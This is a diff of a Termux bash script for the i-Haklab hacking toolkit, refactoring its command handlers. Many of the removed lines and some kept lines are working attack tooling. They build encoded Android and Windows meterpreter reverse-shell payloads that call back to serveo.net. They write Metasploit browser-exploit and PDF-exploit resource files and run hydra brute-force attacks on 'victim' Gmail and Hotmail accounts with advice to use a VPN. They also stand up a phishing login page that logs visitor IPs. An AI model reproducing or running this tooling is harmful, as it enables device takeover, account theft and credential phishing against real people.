@@ -1,150 +1,41 @@
 #!/data/data/com.termux/files/usr/bin/bash
 #Created on Dec/2018
 IFS=$'\n\t'
-#trap ctrl_c 2
 
-source /data/data/com.termux/files/usr/libexec/colors
-
-ctrl_c() {
-                echo
-                printf "$Y\n[!]$R Going me on$B Telegram$R t.me/Ivam3byCinderella$W\n"
-}
-banner() {
-	if [ -e $iHAKLAB/.set/libexec/banner/i-Haklab ]; then
-		bash $iHAKLAB/.set/libexec/banner/i-Haklab
-		sleep 0.5
-	fi
-}
-k-boom() {
-	if [ -e $iHAKLAB/.set/libexec/banner/k-boom ]; then
-		bash $iHAKLAB/.set/libexec/banner/k-boom
-	fi
-}
-chk-api() {
-	command -v termux-open > /dev/null || { printf "$R[w]->$W termux-tools needed$R |$W please install it"; exit; }
-}
-chk-sudo() {
-	command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
-}
-chk-msf() {
-	command -v msfconsole > /dev/null || { printf "$R\n[W]->$W Metasploit needed$R |$W please install it"; exit; }
-}
-chk-php() {
-	command -v php > /dev/null || { printf "$R\n[W]->$W php not found$R |$W run apt install php"; exit; }
-}
-chk-ssh() {
-	command -v ssh > /dev/null || { printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"; exit; }
-}
-chk-mega() {
-	command -v megadl > /dev/null || { printf "$R\n[W]->$W megatools not found$R |$W run apt install megatools"; exit; }
-}
-chk-hydra() {
-	command -v hydra > /dev/null || { printf "$R\n[W]->$W hydra not found$R |$W run apt install hydra"; exit; }
-}
-
-if [ -L ~/storage/external-1 ]; then
-	iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
+if [ -d /data/data/com.termux/files/home/i-Haklab ]; then
+	iHAKLAB=/data/data/com.termux/files/home/i-Haklab
+elif [ -d /data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab ]; then
+        iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
 else
-        iHAKLAB=/data/data/com.termux/files/home/i-Haklab
+	chk-iHaklab
 fi
 
-while [ "$USER" = "root" ]; do
-	printf "$R\n[W]:-> You need to be a common user$W\n"
-	exit
-done
-
-until [ -d $iHAKLAB ]; do
-	printf "$R\n[W]:-> i-Haklab needed$W |$Y Do y ou wanna install it?$W\n"
-	while read -p "[yes/no]:-> " yesorno && [ -z $yesorno ]; do
-		continue
-	done
-	if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
-		git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
-		cd ~/i-Haklab;bash setup
-	else 
-		printf "$G\n[!]-> Have a nice hacking day!!\n\n"
-		exit
-	fi
-done
-
-TOOL=$(ls $iHAKLAB/.set/to-install/ | grep -iv .zip | grep -iv instasudo | grep -iv QG | grep -iv i-Haklab_login | grep -iv check-root | grep -iv functions | grep -n -iv lock)
-TARGET=(0 1 2 3 29)
-SSH=$(netstat | grep -c "ssh")
-LOCALHOST=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
-CHECKROOT=$(bash $iHAKLAB/.set/to-install/check-root)
-SITE=$(ls $iHAKLAB/.set/phishing)
+source $iHAKLAB/.set/libexec/colors
+source $iHAKLAB/.set/var/variables
+source $iHAKLAB/.set/functions/functions
+chk-Cuser
 
 if [ "$CHECKROOT" = "root" ]; then
 	LPORT=80
 else
 	LPORT=4546
 fi
-
+banner
 if [ -z $1 ] || [ $1 = help ]; then
-	banner
-	printf "$Y\n[i]->$W i-Haklab v.1.0 (c) 2019 by Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. If the law is violated with it's use, this would be the responsibility of the user who handled it.\n\nSyntax: i-Haklab [-arg-] [-option-]\n
-Arguments  |    Options     |    Description
-╰─help─────➤────────────────➤ Show this help menu
-╰─list─────➤────────────────➤ List all available tools/frameworks
-╰─show─────➤──tools/books───➤ Show details about specific tool and books availables to be downloaded
-|   |		╰─────|─────➤ example : i-Haklab show bettercap
-|   |		      ╰─────➤ example : i-Haklab show books
-|   ╰──────➤──tutorials/QG──➤ Show tutorials and Quick Guides availables
-╰─install──➤───tool─name────➤ Install tools or frameworks
-╰─remove───➤───tool─name────➤ Remove tools or frameworks
-╰─weechat──➤────────────────➤ Connect with irc Ivam3byCinderella chat
-╰─update───➤────────────────➤ Update i-Haklab
-╰─upgrade──➤────────────────➤ Upgrade i-Haklab by installing/upgrading tools
-╰speedtest─➤────────────────➤ Run a speed test of your network
-╰─restore──➤────────────────➤ Restore the main directory to fix some bugs
-╰reinstall─➤────────────────➤ Reinstall i-Haklab to factory configurations
-╰─version──➤────────────────➤ Show i-Haklab version installed
-           |       |        |
-	   |       |        |
-   [--] Automatitation Arguments [--]
-Arguments  |    Options     |    Description
-╰─handler──➤──file.rc name──➤ Start handler on msfconsole with previous setting
-╰───apk────➤──inlan/outlan──➤ Create a coded payload apk with msfvenom
-|               ╰─────|─────➤ LPORT=4546 Payload=android/meterpreter/reverse_tcp apk=inlan.apk
-|                     ╰─────➤ LPORT=48263 LHOST=serveo.net apk=outlan.apk
-|                             Payload=android/meterpreter/reverse_tcp
-╰─paylink──➤─pc/nexam/soa5──➤ Create a link payload with handler
-|             ╰───|────|────➤ For targets [0]generic, [1]windows, [2]macOS and [3]linux
-|                 |    |      example: i-Haklab paylink pc 2
-|                 ╰────|────➤ For targets [0]nexxus and [29]samsung
-|                      |      example: i-Haklab paylink nexam 29
-|                      ╰────➤ For android operative system equal at version 5 to down
-╰──paypdf──➤────────────────➤ Create a pdf file with a reverse payload
-╰──payexe──➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
-|               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
-|                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
-|                             LHOST=serveo.net file=outlan.exe
-╰─shodan───➤────────────────➤ Search vulnerable servers using metasploit with shodan
-╰─bfmail───➤──email─passwd──➤ Start a brute force attack with hydra tool at email(hotmail/gmail) account
-|    ╰─────➤─────gmail──────➤ example: i-Haklab bfgmail victim@gmail.com passwords.txt
-|    ╰─────➤──hotmail/live──➤ example: i-Haklab bfgmail victim@live.com passwords.txt
-╰──bfftp───➤─user─passwd─ip─➤ Start a brute force attack with hydra at ftp server
-|    ╰─────➤────────────────➤ example: i-Haklab bfftp users.txt passwords.txt 0.0.0.0
-╰forwarding➤────────────────➤ Start a SSH client to request TCP port forwarding from server and proxy.
-     ╰─────➤──port_number───➤ Set a specific port number (default 4546 or 80 for rooted device)
-|    ╰─────➤───subdomain────➤ Set a specitic subdomain | example: i-Haklab forwarding <myport> <my-subdomain>
-╰─phishing─➤──site─redirect─➤ Clone a specific website for phishing tests 
-     ╰─────➤────────────────➤ Available: facebook mfacebook
-     ╰─────➤────────────────➤ example: i-Haklab mfacebook m.facebook.com
-|__________________________________________________________________________________________\n\n"
+	Menu
+
+
 elif [ $1 = list ]; then
-	banner
 	printf "$TOOL"
+
+
 elif [ $1 = show ] && [ -z $2 ]; then
         printf "$R[w]->$W Show argument need an option\n"
 elif [ $1 = show ] && [ $2 ]; then
-	TOOL=$(ls $iHAKLAB/.set/libexec/Readme/ | grep $2)
-	if [ "$TOOL" = $2 ]; then
-		banner
+	if [ "$README_TOOL" = $2 ]; then
 		cat $iHAKLAB/.set/libexec/Readme/$2
 		echo
-	elif [ $2 = books ]; then #&& [ $3 = $BOOK ]; then
-		banner
+	elif [ $2 = books ]; then
 		cat $iHAKLAB/.set/libexec/Books/List | awk '{print $1,$2}'
 		printf "$Y\n[?]->$W Type the book's number or press$R enter$W to exit\n"
 		while read -p "[+]:─➤ " ANSW && [ -z $ANSW ]; do
@@ -161,7 +52,6 @@ elif [ $1 = show ] && [ $2 ]; then
 			fi
 		fi
 	elif [ $2 = tutorials ]; then
-		banner
 		cat $iHAKLAB/.set/libexec/Tutorials/List
 		printf "$G\n[?]─> Choose one option:─➤ "
 		read ANSW
@@ -170,13 +60,10 @@ elif [ $1 = show ] && [ $2 ]; then
 			chk-api
 			termux-open https://t.me/Ivam3byCinderella/$ANSW
 		else
-			clear
-			banner
 			printf "$R[w]->$W Unable to locate option $ANSW\n"
 		fi
 	elif [ $2 = QG ]; then
 		if [ -d $iHAKLAB/QuickGuides ]; then
-			banner
 			ls $iHAKLAB/QuickGuides
 			printf "$Y\n[?]->$W Type QG name or press$R enter$W to exit\n"
 			while read -p "[+]:─➤ " ANSW && [ -z $ANSW ]; do
@@ -193,10 +80,11 @@ elif [ $1 = show ] && [ $2 ]; then
 	else
 		printf "$R[w]->$W Unable to locate option $2\n"
 	fi
+
+
 elif [ $1 = install ] && [ -z $2 ]; then
 	printf "$R[w]->$W Install argument need an option\n"
 elif [ $1 = install ] && [ $2 ]; then
-	banner
 	TOOL=$(ls $iHAKLAB/.set/to-install/ | grep -iv .zip | grep $2)
 	if [ "$TOOL" = $2 ]; then
 		bash $iHAKLAB/.set/to-install/$TOOL
@@ -207,24 +95,25 @@ elif [ $1 = install ] && [ $2 ]; then
 		sleep 1
 		apt install $2 -y
 	fi
+
+
 elif [ $1 = remove ] && [ -z $2 ]; then
         printf "$R[w]->$W remove argument need an option\n"
 elif [ $1 = remove ] && [ $2 ]; then
         TOOL=$(ls $iHAKLAB/.set/to-remove | grep -iv .zip | grep $2)
         if [ "$TOOL" = $2 ]; then
-		banner
 		bash $iHAKLAB/.set/to-remove/$TOOL
 		k-boom
 	elif [ -e $PREFIX/bin/$2 ]; then
-		banner
 		apt remove $2 -y
 		apt autoremove -y
 		k-boom
 	else
 		printf "$R[w]->$W Unable to locate tool/framework $2\n"
 	fi
+
+
 elif [ $1 = weechat ]; then
-	banner
 	if [ ! -e $PREFIX/bin/weechat ]; then
 		apt install weechat -y
 	fi
@@ -232,31 +121,35 @@ elif [ $1 = weechat ]; then
 	read enter
 	weechat
 	k-boom
+
+
 elif [ $1 = update ]; then
-	banner
 	CHECK=$(cd $iHAKLAB;git pull | grep -oE Already)
 	if [ $CHECK ]; then 
 		printf "$G\n[i]->$W Already up to date$G <-[i]$W\n"
 	else
 		printf "$Y\n[i]->$W There is a new version, run i-Haklab upgrade$Y <-[i]$W\n"
 	fi
+
+
 elif [ $1 = upgrade ]; then
-	banner
-	cd $iHAKLAB;git pull > /dev/null
+	cd $iHAKLAB;git pull > /dev/null 2>&1
 	curl https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/libexec/upgrade -o $PREFIX/tmp/upgrade > /dev/null 2>&1
 	chmod +x $PREFIX/tmp/upgrade
 	bash $PREFIX/tmp/upgrade
 	rm $PREFIX/tmp/upgrade
+
+
 elif [ $1 = speedtest ]; then
-	banner
 	command -v python > /dev/null 2>&1 || apt install python -y /dev/null 2>&1
 	command -v speedtest-cli > /dev/null 2>&1 || python -m pip install speedtest-cli /dev/null 2>&1
 	printf "$Y[!]->$W Running speed test . . .$G\n"
 	speedtest-cli --simple
 	printf "$W"
+
+
 elif [ $1 = restore ]; then
 	if [ -d $iHAKLAB ]; then
-		banner
 		printf "$Y[!]->$W Restoring (It could take a while) ...\n"
 		rm -rf $iHAKLAB > /dev/null 2>&1
 		while [ ! -d $iHAKLAB ]; do
@@ -270,249 +163,79 @@ elif [ $1 = restore ]; then
 	else
 		printf "$R[w]->$W The main directory not found.\n"
 	fi
+
+
 elif [ $1 = reinstall ]; then
-	banner
 	if [ -e $iHAKLAB/.set/libexec/reinstall ]; then
 		bash $iHAKLAB/.set/libexec/reinstall
 	else
 		printf "$R\n[w]-> Fatal error\n$Y[!] please run$G i-Haklab restore$Y and try again$W\n"
 		exit
 	fi
+
+
 elif [ $1 = version ]; then
-	banner
 	cat $iHAKLAB/README.md | grep -o v.*.*.9 | awk '{print $1}'
+
+
 elif [ $1 = apk ] && [ -z $2 ]; then
 	printf "$R[w]->$W apk argument need an option\n"
 elif [ $1 = apk ] && [ $2 ]; then
 	if [ $2 = inlan ]; then
-		banner
-		if [ ! -d ~/java/handler ]; then
-			mkdir -p ~/java/handler
-		fi
 		chk-msf
-		msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o inlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
-		echo "use exploit/multi/handler" > ~/java/handler/inlan.apk.rc
-		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/inlan.apk.rc
-		echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.apk.rc
-		echo "set LPORT 4546" >> ~/java/handler/inlan.apk.rc
-		echo "run" >> ~/java/handler/inlan.apk.rc
-		printf "$Y[i]->$W Payload saved as$G inlan.apk$W\n"
-		printf "$Y[i]->$W Handler file saved as$G inlan.apk.rc$W\n"
+		bash $iHAKLAB/.set/share/apk_inlan
 	elif [ $2 = outlan ] && [ -z $3 ]; then
 		printf "$R[w]->$W Argument outlan need a server as an option"
 	elif [ $2 = outlan ] && [ $3 ]; then
-		banner
-		if [ ! -d ~/java/handler ]; then
-			mkdir -p ~/java/handler
-		fi
 		chk-msf
-		msfvenom -p android/meterpreter/reverse_tcp LHOST=$3 LPORT=48263 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n" 
-		echo "use exploit/multi/handler" > ~/java/handler/outlan.apk.rc
-		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/outlan.apk.rc
-		echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.apk.rc
-		echo "set LPORT 4546" >> ~/java/handler/outlan.apk.rc
-		echo "run" >> ~/java/handler/outlan.apk.rc
-		printf "$Y[i]->$W Payload saved as$G outlan.apk$W\n"
-		printf "$Y[i]->$W Handler file saved as$G outlan.apk.rc$W\n"
+		bash $iHAKLAB/.set/share/apk_outlan
 	else
 		printf "$R[w]->$W invalid option\n"
 	fi
+
+
 elif [ $1 = payexe ] && [ -z $2 ]; then
         printf "$R[w]->$W payexe argument need an option\n"
 elif [ $1 = payexe ] && [ $2 ]; then
         if [ $2 = inlan ]; then
-                banner
-		if [ ! -d ~/java/handler ]; then
-			mkdir -p ~/java/handler
-		fi
-		chk-msf
-                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -f exe -e x86/shikata_ga_nai -i 5 -o inlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
-                echo "use exploit/multi/handler" > ~/java/handler/inlan.exe.rc
-                echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/inlan.exe.rc
-                echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.exe.rc
-                echo "set LPORT 4546" >> ~/java/handler/inlan.ex.rc
-                echo "run" >> ~/java/handler/inlan.exe.rc
-                printf "$Y[i]->$W Payload saved as$G inlan.exe$W\n"
-                printf "$Y[i]->$W Handler file saved as$G inlan.exe.rc$W\n"
+                chk-msf
+		bash $iHAKLAB/.set/share/payexe_inlan
 	elif [ $2 = outlan ] && [ -z $3 ]; then
 		printf "$R[w]->$W Argument outlan need a server as an option"
 	elif [ $2 = outlan ] && [ $3 ]; then
-		banner
-		if [ ! -d ~/java/handler ]; then
-			mkdir -p ~/java/handler
-		fi
 		chk-msf
-		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$3 LPORT=48263 -f exe -e x86/shikata_ga_nai -i 5 -o outlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
-                echo "use exploit/multi/handler" > ~/java/handler/outlan.exe.rc
-                echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/outlan.exe.rc
-                echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.exe.rc
-                echo "set LPORT 4546" >> ~/java/handler/outlan.exe.rc
-                echo "run" >> ~/java/handler/outlan.exe.rc
-                printf "$Y[i]->$W Payload saved as$G outlan.exe$W\n"
-                printf "$Y[i]->$W Handler file saved as$G outlan.exe.rc$W\n"
-        else
+		bash $iHAKLAB/.set/share/payexe_outlan
+	else
                 printf "$R[w]->$W invalid option\n"
         fi
+
+
 elif [ $1 = paylink ] && [ -z $2 ]; then
 	printf "$R[w]->$W paylink argument need an option and target\n"
 elif [ $1 = paylink ] && [ $2 = pc ] && [ -z $3 ]; then
 	printf "$R[w]->$W pc options need a target\n"
 elif [ $1 = paylink ] && [ $2 = pc ] && [ $3 ]; then
-	until [ -d ~/java/handler/ ]; do
-		printf "$R[w]->$W The hanlder box is empty\n"
-		exit
-	done
-	for i in ${TARGET[*]}; do
-		if [ $3 = $i ]; then
-			if [ ! -e ~/java/handler/paylink-pc-$3.rc ]; then
-				banner
-				echo "use exploit/multi/browser/java_jre17_jmxbean_2" > ~/java/handler/paylink-pc-$3.rc
-				echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-pc-$3.rc
-				echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-pc-$3.rc
-				echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-pc-$3.rc
-				echo "set LPORT 4546" >> ~/java/handler/paylink-pc-$3.rc
-				echo "set URIPATH /" >> ~/java/handler/paylink-pc-$3.rc
-				echo "set target $3" >> ~/java/handler/paylink-pc-$3.rc
-				echo "run" >> ~/java/handler/paylink-pc-$3.rc
-				if [ $CHECKROOT = "root" ]; then
-					chk-sudo
-					chk-msf
-					printf "$Y[i]->$W Handler file saved as$G paylink-pc-$3.rc$W\n"
-					sleep 1
-					sudo msfconsole -q -r ~/java/handler/paylink-pc-$3.rc
-				else
-					printf "$Y[i]->$W Handler file saved as$G paylink-pc-$3.rc$W\n"
-					sleep 1
-					chk-msf
-					msfconsole -q -r ~/java/handler/paylink-pc-$3.rc
-				fi
-			else
-				printf "$R[w]->$W File paylink-pc-$3.rc already exist\n"
-			fi
-		fi
-	done
+	bash $iHAKLAB/.set/share/paylink_pc
 elif [ $1 = paylink ] && [ $2 = nexam ] && [ -z $3 ]; then
         printf "$R[w]->$W nexam option need a target\n"
 elif [ $1 = paylink ] && [ $2 = nexam ] && [ $3 ]; then
-        until [ -d ~/java/handler/ ]; do
-                printf "$R[w]->$W The hanlder box is empty\n"
-                exit
-        done
-        for i in ${TARGET[*]}; do
-                if [ $3 = $i ]; then
-                        if [ ! -e ~/java/handler/paylink-nexam-$3.rc ]; then
-				banner
-                                echo "use exploit/android/browser/stagefright_mp4_tx3g_64bit" > ~/java/handler/paylink-nexam-$3.rc
-                                echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-nexam-$3.rc
-                                echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-nexam-$3.rc
-                                echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-nexam-$3.rc
-                                echo "set LPORT 4546" >> ~/java/handler/paylink-nexam-$3.rc
-                                echo "set URIPATH /" >> ~/java/handler/paylink-nexam-$3.rc
-                                echo "set target $3" >> ~/java/handler/paylink-nexam-$3.rc
-                                echo "run" >> ~/java/handler/paylink-nexam-$3.rc
-                                if [ $CHECKROOT = "root" ]; then
-					chk-sudo
-					chk-msf
-					printf "$Y[i]->$W Handler file saved as$G paylink-nexam-$3.rc$W\n"
-					sleep 1
-                                        sudo msfconsole -q -r ~/java/handler/paylink-nexam-$3.rc
-                                else
-					printf "$Y[i]->$W Handler file saved as$G paylink-nexam-$3.rc$W\n"
-					sleep 1
-					chk-msf
-                                        msfconsole -q -r ~/java/handler/paylink-nexam-$3.rc
-                                fi
-                        else
-                                printf "$R[w]->$W File paylink-nexam-$3.rc already exist\n"
-                        fi
-                fi
-        done
+	bash $iHAKLAB/.set/share/paylink_nexam
 elif [ $1 = paylink ] && [ $2 = soa5 ]; then
-        until [ -d ~/java/handler/ ]; do
-                printf "$R[w]->$W The hanlder box is empty\n"
-                exit
-        done
-	if [ ! -e ~/java/handler/paylink-soa5.rc ]; then
-		banner
-		echo "use exploit/android/browser/webview_addjavascriptinterface" > ~/java/handler/paylink-soa5.rc
-                echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-soa5.rc
-                echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-soa5.rc
-                echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-soa5.rc
-                echo "set LPORT 4546" >> ~/java/handler/paylink-soa5.rc
-                echo "set URIPATH /" >> ~/java/handler/paylink-soa5.rc
-                echo "run" >> ~/java/handler/paylink-soa5.rc
-		if [ $CHECKROOT = "root" ]; then
-			chk-sudo
-			chk-msf
-			printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
-			sleep 1
-			sudo msfconsole -q -r ~/java/handler/paylink-soa5.rc
-                else
-			printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
-			sleep 1
-			chk-msf
-                        msfconsole -q -r ~/java/handler/paylink-soa5.rc
-                fi
-        else
-                printf "$R[w]->$W File paylink-nexam-soa5.rc already exist\n"
-        fi
+	bash $iHAKLAB/.set/share/paylink_soa5
+
+
 elif [ $1 = forwarding ] && [ -z $2 ]; then
-	if [ $SSH = "1" ]; then 
-		killall -2 ssh > /dev/null 2>&1
-	fi
-	banner
 	chk-ssh
-	if [ ! -d $HOME/localtunnel-server ]; then
-		printf "$R\n[w]-> ERROR :$W Localtunnel-server is not installed\n"
-	else
-		LPORT=4546
-		printf "$R\n[w]-> No port specified"
-		sleep 1
-		printf "$Y\n[!]-> Using default$W : $LPORT\n$G"
-		$(which lt) -h "http://serverless.social" -p $LPORT --print-requests
-	fi
+	bash $iHAKLAB/.set/share/forwarding_default
 elif [ $1 = forwarding ] && [ $2 ] && [ -z $3 ]; then
-	if [ $SSH = "1" ]; then 
-		killall -2 ssh > /dev/null 2>&1
-	fi
-        banner
-        chk-ssh
-        if [ ! -d $HOME/localtunnel-server ]; then
-                printf "$R\n[w]-> ERROR :$W Localtunnel-server is not installed\n"
-        else
-		if [ $2 -gt 1000 ]; then
-			LPORT=$2
-		else
-			LPORT=4546
-			printf "$R\n[w]-> ERROR :$W Invalid port"
-			sleep 1
-			printf "$Y\n[!] using default$W : $LPORT\n"
-		fi
-		printf "$G"
-		$(which lt) -h "http://serverless.social" -p $LPORT --print-requests
-	fi
+	chk-ssh
+	bash $iHAKLAB/.set/share/forwarding_port
 elif [ $1 = forwarding ] && [ $2 ] && [ $3 ]; then
-	if [ $SSH = "1" ]; then
-		killall -2 ssh > /dev/null 2>&1
-	fi
-		banner
-		chk-ssh
-	if [ ! -d $HOME/localtunnel-server ]; then
-                printf "$R\n[w]-> ERROR :$W Localtunnel-server is not installed\n"
-        else
-		if [ $2 -gt 1000 ]; then
-			LPORT=$2
-		else
-			LPORT=4546
-			printf "$R\n[w]-> ERROR :$W Invalid port"
-			sleep 1
-			printf "$Y\n[!] using default$W : $LPORT\n"
-		fi
-		printf "$G"
-		$(which lt) -h "http://serverless.social" -p $LPORT -s $3 --print-requests
-        fi
+	chk-ssh
+	bash $iHAKLAB/.set/share/forwarding_dns
+
+
 elif [ $1 = handler ] && [ -z $2 ]; then
-	banner
 	printf "$R[w]->$W handler argument need an option$R |$W use one of those:\n"
 	if [ -d ~/java/handler ]; then
 		ls ~/java/handler | grep .rc | sort
@@ -534,83 +257,28 @@ elif [ $1 = handler ] && [ $2 ]; then
 	else
 		printf "$R[w]->$W File $2 doesn't exist\n"
 	fi
+
+
 elif [ $1 = shodan ]; then
 	chk-msf
-	if [ ! -e $PREFIX/opt/metasploit-framework/documentation/api/apikey ]; then
-		touch $PREFIX/opt/metasploit-framework/documentation/api/apikey
-	fi
-	APIKEYFILE=$PREFIX/opt/metasploit-framework/documentation/api/apikey
-	if [ ! $(cat $APIKEYFILE) ]; then
-		printf "$Y[?]->$W Type your shodan APIKEY "
-		while read -p ">> " ANSW && [ -z $ANSW ]; do
-                printf "$R[w]-> Go to www.shodan.io to get your APIKEY$W\n"
-		exit
-        done
-        echo $ANSW > $APIKEYFILE
-	fi
-        APIKEY=$(cat $APIKEYFILE)
-	if [ -e $iHAKLAB/.set/shodan/query ]; then
-		printf "$Y[?]->$W Choose a type of search :\n"
-		cat $iHAKLAB/.set/shodan/query | sort
-		echo
-		while read -p ">> " QUERY && [ -z $QUERY ]; do
-			printf "$R"
-		done
-	else
-		printf "$R[w]-> ERROR :$W Not such query file\n"
-	fi
-        echo "use auxiliary/gather/shodan_search" > ~/java/handler/shodan-cam.rc
-        echo "set SHODAN_APIKEY $APIKEY" >> ~/java/handler/shodan-cam.rc
-        echo "set QUERY \"$QUERY\"" >> ~/java/handler/shodan-cam.rc
-        echo "run" >> ~/java/handler/shodan-cam.rc
-	printf "$Y[!]-> If some target need user/passwd you can use those :$W\n"
-	cat $iHAKLAB/.set/shodan/usrpasswd.txt
-	printf "\n\tpress$G ENTER$W to continue\n"
-	read enter
-        msfconsole -q -r ~/java/handler/shodan-cam.rc
+	bash $iHAKLAB/.set/share/shodan
+
+
 elif [ $1 = paypdf ] && [ -z $2 ]; then
 	printf "$R[w]->$W argument paypdf need a pdf file name\n"
 elif [ $1 = paypdf ] && [ $2 ]; then
-	banner
 	chk-msf
-	printf "$G[-]-> i-Haklab :$W creating pdf file and running handler\n"
-	echo "use exploit/android/fileformat/adobe_reader_pdf_js_interface" > ~/java/handler/paypdf.rc
-	echo "set LHOST serveo.net" >> ~/java/handler/paypdf.rc
-        echo "set LPORT 48263" >> ~/java/handler/paypdf.rc
-	echo "set FILENAME $2.pdf" >> ~/java/handler/paypdf.rc
-        echo "run" >> ~/java/handler/paypdf.rc
-	echo "use exploit/multi/handler" >> ~/java/handler/paypdf.rc
-	echo "set LHOST $LOCALHOST" >> ~/java/handler/paypdf.rc
-	echo "set LPORT $LPORT" >> ~/java/handler/paypdf.rc
-	echo "run" >> ~/java/handler/paypdf.rc
-	if [ $CHECKROOT = 'root' ]; then
-		sudo msfconsole -q -r ~/java/handler/paypdf.rc
-	else
-		msfconsole -q -r ~/java/handler/paypdf.rc
-	fi
+	bash $iHAKLAB/.set/share/paypdf
+
+
 elif [ $1 = bfmail ] && [ -z $2 ]; then
         printf "$R[w]->$W bfmail argument need a mail/victim as option 1$G\n[ex]->$W i-Haklab bfmail victim@gmail.com passwords.txt"
 elif [ $1 = bfmail ] && [ $2 ] && [ -z $3 ]; then
         printf "$R[w]->$W bfmail argument need a passwords file as option 2$G\n[ex]->$W i-Haklab bfmail victim@hotmail.com passwords.txt"
 elif [ $1 = bfmail ] && [ $2 ] && [ $3 ]; then
-        echo $2 > $PREFIX/tmp/bfmail
-        MAIL=$(cat $PREFIX/tmp/bfmail | grep -oE '([hotgmailve]{4,7})')
-        if [ ! -e $3 ]; then
-                printf "$R[w]->$W File for passwords not found"
-        elif [ -e $3 ] && [ "$MAIL" = "hotmail" -o "$MAIL" = "live" -o "$MAIL" = "gmail" ]; then
-                rm $PREFIX/tmp/bfmail
-                printf "$R[w]-> USE SOME VPN <-[w]$W\n  press$G enter$W to start\n"
-                read enter
-		if [ "$MAIL" = hotmail -o "$MAIL" = "live" ]; then
-			SMTP=smtp.live.com
-		elif [ "$MAIL" = "gmail" ]; then
-			SMTP=smtp.gmail.com
-		else
-			printf "$R[w]->$W There is not a valid server"
-		fi
-		chk-hydra
-                hydra -S -l $2 -P $3 -e ns -V -s 465 $SMTP smtp
-        fi
+	bash $iHAKLAB/.set/share/bfmail
+
+
 elif [ $1 = bfftp ] && [ -z $2 ]; then
         printf "$R[w]->$W bfftp argument need a users file as option 1$G\n[ex]->$W i-Haklab bfftp users.txt passwords.txt 0.0.0.0"
 elif [ $1 = bfftp ] && [ $2 ] && [ -z $3 ]; then
@@ -627,175 +295,19 @@ elif [ $1 = bfftp ] && [ $2 ] && [ $3 ] && [ $4 ]; then
                 read enter
 		chk-hydra
                 hydra -L $2 -P $3 $4 ftp
+	else
+		ctrl_c
         fi
+
 
 elif [ $1 = phishing ] && [ -z $2 ];then
 	printf "$R[w]->$W Phishing argument needs a website as an option1"
 elif [ $1 = phishing ] && [ $2 ] && [ -z $3 ]; then
 	printf "$R[w]->$W Phishing argument needs a redirection as an option2"
 elif [ $1 = phishing ] && [ $2 ] && [ $3 ]; then
-	if [ -e $iHAKLAB/.set/phishing/$2 ]; then
-		TMP_PATH=$PREFIX/var/service/php/$2
-		for FILE in ip.txt usernames.txt iptracker.log ; do
-			if [ -e $TMP_PATH/$FILE ]; then
-				echo
-		#		rm $TMP_PATH/$FILE > /dev/null 2>&1
-			fi
-		done
-		banner
-		if [ ! -d $TMP_PATH ]; then
-			mkdir -p $TMP_PATH
-		fi
-		echo "<?php" > $TMP_PATH/index.php
-		echo "include 'ip.php';" >> $TMP_PATH/index.php
-		echo "header('Location: login.html');" >> $TMP_PATH/index.php
-		echo "exit" >> $TMP_PATH/index.php
-		echo '?>' >> $TMP_PATH/index.php
-		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$2 -O $TMP_PATH/login.html > /dev/null 2>&1
-		echo "<?php" > $TMP_PATH/ip.php
-		echo " " >> $TMP_PATH/ip.php
-		echo "if (!empty(\$_SERVER['HTTP_CLIENT_IP']))" >> $TMP_PATH/ip.php
-		echo "    {" >> $TMP_PATH/ip.php
-		echo "      \$ipaddress = \$_SERVER['HTTP_CLIENT_IP'].\"\r\n\";" >> $TMP_PATH/ip.php
-		echo "    }" >> $TMP_PATH/ip.php
-		echo "elseif (!empty(\$_SERVER['HTTP_X_FORWARDED_FOR']))" >> $TMP_PATH/ip.php
-		echo "    {" >> $TMP_PATH/ip.php
